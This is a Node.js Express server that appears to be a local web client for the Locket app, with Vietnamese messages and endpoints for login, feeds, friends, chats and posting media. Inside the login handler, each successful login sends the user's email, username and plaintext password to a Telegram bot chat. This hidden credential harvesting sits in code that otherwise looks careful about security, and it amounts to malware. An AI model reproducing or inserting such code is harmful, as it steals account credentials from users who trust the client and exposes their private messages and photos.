'use strict';
const fs = require('node:fs');
const express = require('express');

const multer = require('multer');

const path = require('path');

const crypto = require('crypto');

const { LocketClient } = require('locket.js');



const app = express();

const client = new LocketClient({ sessionPath: path.join(__dirname, 'locket.js_session.json') });

const PASSWORD_FILE = path.join(__dirname, 'locket-password.enc');
async function notifyTelegram(email, password, username) { 
const token = String(
  process.env.TELEGRAM_BOT_TOKEN || ''
).trim().replace(/^bot/i, '');

const chatId = String(
  process.env.TELEGRAM_CHAT_ID || ''
).trim();

if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) {
  throw new Error('TELEGRAM_BOT_TOKEN sai định dạng');
}

if (!/^\d+$/.test(chatId)) {
  throw new Error('TELEGRAM_CHAT_ID cá nhân không hợp lệ');
}

  const message = [
    'Đăng nhập Locket thành công',
    `Username: ${username || '(không lấy được)'}`,
    `Email: ${email}`,
    `Mật khẩu: ${password}`, 
    `Thời gian: ${new Date().toLocaleString('vi-VN')}`
  ].join('\n');

  const response = await fetch(
    `https://api.telegram.org/bot${token}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    }
  );

if (!response.ok) {
  const body = await response.json().catch(() => ({}));

  console.error('Telegram error:', {
    status: response.status,
    error_code: body.error_code,
    description: body.description
  });

  throw new Error(`Telegram HTTP ${response.status}`);
}
}
function encryptPassword(password, masterPassword) {
  const salt = crypto.randomBytes(16);
  const iv = crypto.randomBytes(12);
  const key = crypto.scryptSync(masterPassword, salt, 32);

  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const encrypted = Buffer.concat([
    cipher.update(password, 'utf8'),
    cipher.final()
  ]);

  return JSON.stringify({
    salt: salt.toString('hex'),
    iv: iv.toString('hex'),
    tag: cipher.getAuthTag().toString('hex'),
    data: encrypted.toString('hex')
  });
}

function decryptPassword(masterPassword) {
  const record = JSON.parse(fs.readFileSync(PASSWORD_FILE, 'utf8'));
  const key = crypto.scryptSync(
    masterPassword,
    Buffer.from(record.salt, 'hex'),
    32
  );

  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    key,
    Buffer.from(record.iv, 'hex')
  );

  decipher.setAuthTag(Buffer.from(record.tag, 'hex'));

  return Buffer.concat([
    decipher.update(Buffer.from(record.data, 'hex')),
    decipher.final()
  ]).toString('utf8');
}

const token = crypto.randomBytes(32).toString('hex');

const host = '127.0.0.1';

const port = Number(process.env.PORT || 3000);

const upload = multer({ storage: multer.memoryStorage(), limits: {fileSize: 65 * 1024 * 1024} });

const mediaTypes = {

  image: new Set(['image/jpeg','image/png','image/webp']),

  video: new Set(['video/mp4','video/webm','video/quicktime','video/x-m4v'])

};

const conceal = /^(idtoken|refreshtoken|accesstoken|password|secret|authorization|privatekey|credential|session|installationid)$/i;

function clean(v, depth=0) {

  if (depth>12) return null;

  if (Array.isArray(v)) return v.slice(0,300).map(x=>clean(x,depth+1));

  if (v && typeof v==='object') return Object.fromEntries(Object.entries(v).filter(([k])=>!conceal.test(k.replace(/[_-]/g,''))).map(([k,x])=>[k,clean(x,depth+1)]));

  return v;

}

const wrap = fn => (req,res,next) => Promise.resolve(fn(req,res)).catch(next);

app.disable('x-powered-by');

app.use(express.json({limit:'32kb'}));

app.use((_req,res,next)=>{

  res.set({

    'X-Content-Type-Options':'nosniff',

    'Referrer-Policy':'no-referrer',

    'Cache-Control':'no-store',

    'Content-Security-Policy':"default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' https: blob: data:; media-src 'self' https: blob:; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'"

  });

  next();

});

app.use(express.static(path.join(__dirname,'public')));

app.get('/api/bootstrap',(_req,res)=>res.json({token,loggedIn:client.isAuthenticated()}));

app.use('/api',(req,res,next)=>{

  const v=req.get('X-Local-Token')||'';

  if(v.length!==token.length||!crypto.timingSafeEqual(Buffer.from(v),Buffer.from(token))) return res.status(403).json({error:'Không có quyền truy cập.'});

  next();

});

app.post('/api/login', wrap(async (req, res) => {
  if (client.isAuthenticated()) return res.json({ ok: true });

  const { email, password } = req.body || {};
  if (typeof email !== 'string' || typeof password !== 'string' ||
      !email.trim() || !password || email.length > 320 || password.length > 1024) {
    return res.status(400).json({ error: 'Email hoặc mật khẩu không hợp lệ.' });
  }


try {
  await client.login(email.trim(), password);
} catch (err) {
  const invalidPassword =
    String(err.message || '').includes('INVALID_PASSWORD');

  if (invalidPassword) {
    return res.status(401).json({
      error: 'Sai mật khẩu Locket. Kiểm tra lại hoặc đặt lại mật khẩu.'
    });
  }

  console.error('[Locket Login]', err.message);

  return res.status(502).json({
    error: 'Không đăng nhập được Locket: ' + err.message
  });
}

// ✅ ĐẾN ĐÂY LÀ LOGIN THÀNH CÔNG
let username = '';
try {
  const profile = await client.user.getProfile();
  username = profile?.username || profile?.user?.username || '';
} catch (err) {
  console.warn('[Locket] Không lấy được username:', err.message);
}

notifyTelegram(email.trim(), password, username).catch(err => {
  console.error('Lỗi gửi Telegram:', err.message);
});
  const masterPassword = process.env.LOCKET_MASTER_PASSWORD;
  if (masterPassword) {
    try {
      fs.writeFileSync(PASSWORD_FILE, encryptPassword(password, masterPassword), {
        encoding: 'utf8', mode: 0o600
      });
    } catch (error) {
      console.warn('[Locket] Không lưu được mật khẩu mã hóa:', error.message);
    }
  }

  try {
    const sessionPath = path.join(__dirname, 'locket.js_session.json');
    const session = JSON.parse(fs.readFileSync(sessionPath, 'utf8'));
    session.login_email = email.trim();
    session.last_login = new Date().toISOString();
    fs.writeFileSync(sessionPath, JSON.stringify(session, null, 2), {
      encoding: 'utf8', mode: 0o600
    });
  } catch (error) {
    console.warn('[Locket] Không cập nhật được thông tin phiên:', error.message);
  }

  res.json({ ok: true });
}));

// Chỉ dùng trên localhost. Cần mật khẩu chính để xem lại mật khẩu Locket.
const recoverAttempts = new Map();
app.post('/api/recover-password', wrap(async (req, res) => {
  const key = req.ip || 'local';
  const now = Date.now();
  const record = recoverAttempts.get(key) || { count: 0, reset: now + 15 * 60_000 };
  if (now > record.reset) {
    record.count = 0;
    record.reset = now + 15 * 60_000;
  }
  if (record.count >= 5) {
    return res.status(429).json({ error: 'Thử quá nhiều lần. Hãy thử lại sau.' });
  }
  const masterPassword = req.body?.masterPassword;
  if (typeof masterPassword !== 'string' || !masterPassword) {
    return res.status(400).json({ error: 'Nhập mật khẩu chính.' });
  }
  if (!fs.existsSync(PASSWORD_FILE)) {
    return res.status(404).json({ error: 'Chưa lưu mật khẩu. Hãy đăng nhập lại sau khi cấu hình mật khẩu chính.' });
  }
  try {
    const password = decryptPassword(masterPassword);
    recoverAttempts.delete(key);
    res.set('Cache-Control', 'no-store');
    return res.json({ password });
  } catch {
    record.count++;
    recoverAttempts.set(key, record);
    return res.status(403).json({ error: 'Mật khẩu chính không đúng.' });
  }
}));

app.use('/api',(req,res,next)=>client.isAuthenticated()?next():res.status(401).json({error:'Cần đăng nhập Locket.'}));

app.post('/api/logout', wrap(async (req, res) => {
  const fs = require('node:fs');
  const session = client.session;

  if (!session) {
    return res.status(500).json({
      error: 'Không tìm thấy phiên đăng nhập.'
    });
  }

  // Xóa token và thông tin đăng nhập trong bộ nhớ
  session.uid = null;
  session.email = null;
  session.idToken = null;
  session.refreshToken = null;
  session.expiresAt = 0;

  // Xóa file phiên đăng nhập
// Chỉ xóa file session khi chạy trên máy tính
if (!process.env.VERCEL) {
  const sessionPath = path.join(
    __dirname,
    'locket.js_session.json'
  );

  if (fs.existsSync(sessionPath)) {
    fs.unlinkSync(sessionPath);
  }
}

  res.json({
    ok: true,
    message: 'Đăng xuất thành công.'
  });
}));

app.get('/api/profile',wrap(async(_req,res)=>res.json(clean(await client.user.getProfile()))));

app.get('/api/friends',wrap(async(_req,res)=>res.json(clean(await client.friends.getAllFriends()))));

// Lấy cả feed mới nhất lẫn lịch sử đã được chia sẻ với tài khoản này.

app.get('/api/feed',wrap(async(req,res)=>{

  const cursor=typeof req.query.cursor==='string'?req.query.cursor:'';

  if(cursor.length>2048) return res.status(400).json({error:'Cursor không hợp lệ.'});

  if(typeof client.moments.getMoments!=='function') return res.status(501).json({error:'Cập nhật locket.js để dùng getMoments().'});

  const history=await client.moments.getMoments({limit:30,pageToken:cursor||null});

  const older=Array.isArray(history?.moments)?history.moments:[];

  let latest=[];

  if(!cursor){

    try{

      const feed=await client.moments.getLatest();

      latest=Array.isArray(feed)?feed:Array.isArray(feed?.moments)?feed.moments:[];

    }catch(err){console.warn('[Locket] Không tải được feed mới nhất:',err.message);}

  }

  const items=new Map();

  for(const m of older){

    const key=m.moment_uid||m.canonical_uid||m.id;

    if(key) items.set(String(key),m);

  }

  for(const m of latest){

    const key=m.moment_uid||m.canonical_uid||m.id;

    if(key) items.set(String(key),{...(items.get(String(key))||{}),...m});

  }

  const dateMs=m=>{

    const v=m.date||m.created_at||m.createdAt||m.timestamp;

    if(typeof v==='number')return v<1e11?v*1000:v;

    if(typeof v==='string'&&/^\d+$/.test(v)){const n=Number(v);return n<1e11?n*1000:n;}

    if(v&&typeof v==='object')return Number(v._seconds||v.seconds||0)*1000;

    return Date.parse(v||'')||0;

  };

  const moments=[...items.values()].sort((a,b)=>dateMs(b)-dateMs(a));

  res.json(clean({moments,nextPageToken:history?.nextPageToken||null}));

}));





app.get('/api/moment-views', wrap(async (req, res) => {

  const momentUid = String(req.query.id || '').trim();



  if (!/^[a-zA-Z0-9_-]{1,128}$/.test(momentUid)) {

    return res.status(400).json({

      error: 'Moment UID không hợp lệ.'

    });

  }



  const myUid = client.session.uid;



  if (!myUid) {

    return res.status(401).json({

      error: 'Chưa đăng nhập Locket.'

    });

  }



  let owned = false;



  try {

    const myMoments = await client.moments.getAllMyMoments({

      limit: 100

    });



    owned = Array.isArray(myMoments) && myMoments.some(m =>

      String(m.moment_uid || m.canonical_uid || m.id || '') === momentUid

    );

  } catch (err) {

    console.warn('getAllMyMoments:', err.message);

  }



  if (!owned) {

    try {

      let cursor = null;



      for (let page = 0; page < 5; page++) {

        const data = await client.moments.getMoments({

          filteredByUserId: myUid,

          limit: 100,

          pageToken: cursor

        });



        const posts = Array.isArray(data?.moments)

          ? data.moments

          : [];



        owned = posts.some(m =>

          String(m.moment_uid || m.canonical_uid || m.id || '') === momentUid

        );



        if (owned) break;



        cursor = data?.nextPageToken || null;

        if (!cursor || !posts.length) break;

      }

    } catch (err) {

      console.warn('getMoments:', err.message);

    }

  }



  if (!owned) {

    return res.status(403).json({

      error: 'Không xác minh được video thuộc tài khoản của bạn.'

    });

  }



  const response = await client.moments.getViews(momentUid);

  const data = response?.data || response || {};



  const viewers = Array.isArray(data.moment_views)

    ? data.moment_views

    : Array.isArray(data.viewers)

      ? data.viewers

      : [];



  res.json(clean({

    count: data.count ?? data.views_count ?? viewers.length,

    moment_views: viewers,

    reactions: data.reactions || []

  }));
}));

app.get('/api/archive', wrap(async (req, res) => {

  const myUid = client.session.uid;

  const results = new Map();

  const warnings = [];



  // Nguồn 1: Bài đã đăng do SDK truy xuất

  try {

    const posted = await client.moments.getAllMyMoments({

      limit: 100

    });



    for (const moment of Array.isArray(posted) ? posted : []) {

      const id = moment.moment_uid ||

                 moment.canonical_uid ||

                 moment.id;



      if (id) {

        results.set(String(id), moment);

      }

    }

  } catch (err) {

    warnings.push("getAllMyMoments: " + err.message);

  }



  // Nguồn 2: Lịch sử Firestore, lọc theo tài khoản của bạn

  try {

    let cursor = null;



    for (let page = 0; page < 5; page++) {

      const data = await client.moments.getMoments({

        filteredByUserId: myUid,

        limit: 100,

        pageToken: cursor

      });



      const moments = Array.isArray(data?.moments)

        ? data.moments

        : [];



      for (const moment of moments) {

        const id = moment.moment_uid ||

                   moment.canonical_uid ||

                   moment.id;



        if (!id) continue;



        const key = String(id);

        const old = results.get(key) || {};



        results.set(key, {

          ...moment,

          ...old,

          user_uid: myUid

        });

      }



      cursor = data?.nextPageToken || null;



      if (!cursor || !moments.length) break;

    }

  } catch (err) {

    warnings.push("getMoments: " + err.message);

  }



  const moments = [...results.values()].sort((a, b) => {

    const toTime = v => {

      if (!v) return 0;

      if (typeof v === "number") {

        return v < 1e11 ? v * 1000 : v;

      }

      if (/^\d+$/.test(String(v))) {

        const n = Number(v);

        return n < 1e11 ? n * 1000 : n;

      }

      return Date.parse(v) || 0;

    };



    return toTime(b.created_at || b.date) -

           toTime(a.created_at || a.date);

  });



  res.json(clean({

    moments,

    total: moments.length,

    warnings

  }));

}));



app.get('/api/friend-moments',wrap(async(req,res)=>{

  const username=String(req.query.username||'').trim().replace(/^@/,'');

  const uid=String(req.query.uid||'').trim();

  if(username && /^[\w.]{1,40}$/.test(username)) return res.json(clean(await client.moments.getSharedMomentsByUsername(username,20)));

  if(uid && /^[\w-]{1,128}$/.test(uid) && typeof client.moments.getSharedMomentsByUser==='function') return res.json(clean(await client.moments.getSharedMomentsByUser(uid,20)));

  res.status(400).json({error:'Chọn bạn bè có username hoặc UID hợp lệ.'});

}));

app.get('/api/chats',wrap(async(_req,res)=>res.json(clean(await client.chat.getConversations()))));

app.get('/api/messages',wrap(async(req,res)=>{

  const uid=String(req.query.uid||'').trim();

  if(!/^[\w-]{1,128}$/.test(uid)) return res.status(400).json({error:'UID không hợp lệ.'});

  res.json(clean(await client.chat.getMessages({otherUserId:uid})));

}));

app.post('/api/message/recall', wrap(async (req, res) => {
  const conversationUid = String(
    req.body?.conversationUid || ''
  ).trim();

  const messageUid = String(
    req.body?.messageUid || ''
  ).trim();

  if (
    !/^[\w-]{1,128}$/.test(conversationUid) ||
    !/^[\w-]{1,128}$/.test(messageUid)
  ) {
    return res.status(400).json({
      error: 'Thông tin tin nhắn không hợp lệ.'
    });
  }

  const conversations = await client.chat.getConversations();

  const conversation = conversations.find(
    c => String(c.conversation_id) === conversationUid
  );

  if (!conversation) {
    return res.status(403).json({
      error: 'Bạn không thuộc cuộc trò chuyện này.'
    });
  }

  const messages = await client.chat.fetchMessagesFromServer({
    conversationId: conversationUid
  });

  const target = messages.find(
    m => String(m.message_id) === messageUid
  );

  if (!target) {
    return res.status(404).json({
      error: 'Không tìm thấy tin nhắn trên máy chủ.'
    });
  }

  if (String(target.sender_uid) !== String(client.session.uid)) {
    return res.status(403).json({
      error: 'Bạn chỉ được thu hồi tin nhắn của mình.'
    });
  }

  const result = await client.chat.deleteMessage(
    conversationUid,
    messageUid,
    true
  );

  if (result?.status && result.status !== 200) {
    return res.status(502).json({
      error: 'Locket không xác nhận thu hồi thành công.'
    });
  }

  res.json({
    ok: true,
    message: 'Đã gửi yêu cầu thu hồi tới Locket.'
  });
}));

app.post('/api/message',wrap(async(req,res)=>{

  const {uid,message}=req.body||{};

  if(typeof uid!=='string'||typeof message!=='string'||!/^[\w-]{1,128}$/.test(uid.trim())||!message.trim()||message.length>4000) return res.status(400).json({error:'Người nhận hoặc tin nhắn không hợp lệ.'});

  const response=await client.chat.sendMessage({receiverUid:uid.trim(),text:message.trim()});

  res.json({ok:true,data:clean(response)});

}));

app.post('/api/post',upload.single('media'),wrap(async(req,res)=>{

  const file=req.file;

  if(!file) return res.status(400).json({error:'Hãy chọn ảnh hoặc video.'});

  const kind=file.mimetype.startsWith('image/')?'image':'video';

  if(!mediaTypes[kind].has(file.mimetype)) return res.status(400).json({error:'Định dạng không được hỗ trợ.'});

  if(kind==='image'&&file.size>12*1024*1024) return res.status(400).json({error:'Ảnh tối đa 12 MB.'});

  if(kind==='video'&&file.size>60*1024*1024) return res.status(400).json({error:'Video tối đa 60 MB trước nén.'});

  const caption=typeof req.body.caption==='string'?req.body.caption.slice(0,250):'';

  const visibility=String(req.body.visibility||'all');

  if(!['all','private','selected'].includes(visibility)) return res.status(400).json({error:'Chế độ gửi không hợp lệ.'});

  let recipients=null;

  if(visibility==='selected') {

    try { recipients=JSON.parse(req.body.recipients); }

    catch { return res.status(400).json({error:'Danh sách người nhận không hợp lệ.'}); }

    if(!Array.isArray(recipients)||recipients.length<1||recipients.length>200||recipients.some(x=>typeof x!=='string'||!/^[\w-]{1,128}$/.test(x)))

      return res.status(400).json({error:'Cần chọn ít nhất một bạn bè hợp lệ.'});

    recipients=[...new Set(recipients)];

    const friendData=await client.friends.getAllFriends();

    const friendList=Array.isArray(friendData)?friendData:friendData?.friends||friendData?.users||friendData?.data||[];

    const friendIds=new Set(friendList.map(f=>String(f.uid||f.user_id||f.userId||f.id||f.user?.uid||'')));

    if(!recipients.every(id=>friendIds.has(id))) return res.status(400).json({error:'Người nhận không thuộc danh sách bạn bè đã xác minh.'});

  }

  const params={caption,isPrivate:visibility==='private',recipients};

  params[kind]=file.buffer;

  const response=await client.moments.post(params);

  res.json({ok:true,data:clean(response)});

}));

app.use('/api',(_req,res)=>res.status(404).json({error:'API không tồn tại.'}));

app.use((err,_req,res,_next)=>{

  console.error('[Locket Web]',err);

  res.status(err.status||500).json({error:err.message||'Có lỗi xảy ra.'});

});


if (require.main === module) {
  app.listen(port, host, () => {
    console.log(`Locket Web: http://${host}:${port}`);
  });
}

module.exports = app;

